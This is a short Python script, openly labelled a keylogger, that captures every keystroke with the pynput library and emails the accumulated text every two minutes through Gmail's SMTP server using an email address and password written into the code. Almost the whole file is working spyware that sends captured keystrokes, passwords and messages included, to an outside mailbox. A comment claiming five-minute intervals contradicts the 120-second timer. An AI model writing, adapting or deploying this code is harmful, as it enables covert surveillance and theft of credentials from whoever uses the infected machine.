import pynput
from pynput.keyboard import Key, Listener
import threading
import smtplib

keys="Keylogger started" # Just for the first time

def on_press(key):
    global keys
    try:
        keys=keys+str(key.char)
    # Need a special case for space, tab, enter keys as there are no chars! We get AttributeError for those
    except AttributeError:
        if key==key.space:
            keys=keys+" " # To make things cleaner, insert a space for the space key
        else:
            keys=keys+" "+str(key)+" "
   
            
def on_release(key):
    if key==Key.esc:
        return False # Breaks if escape key pressed
    
def report():
    global keys
    if len(keys)>0:
        sendmail("dummylegacy69@gmail.com","dummylegacy1234","\n\n"+keys) #Shoots a mail every 5 mins if not empty \n\n is to avoid text in the subject of the mail. Happens sometimes
    keys=""
    timer=threading.Timer(120, report) # Calls itself every 2 mins without interrupting the main program
    timer.start()

def sendmail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()
    
def main():
    with Listener(on_press=on_press, on_release = on_release) as listener:
#These functions will be called when a key is pressed and released respectively
        report()
        listener.join() # Will continuously keep running this loop until we break out of it
if __name__ == "__main__":
    main()
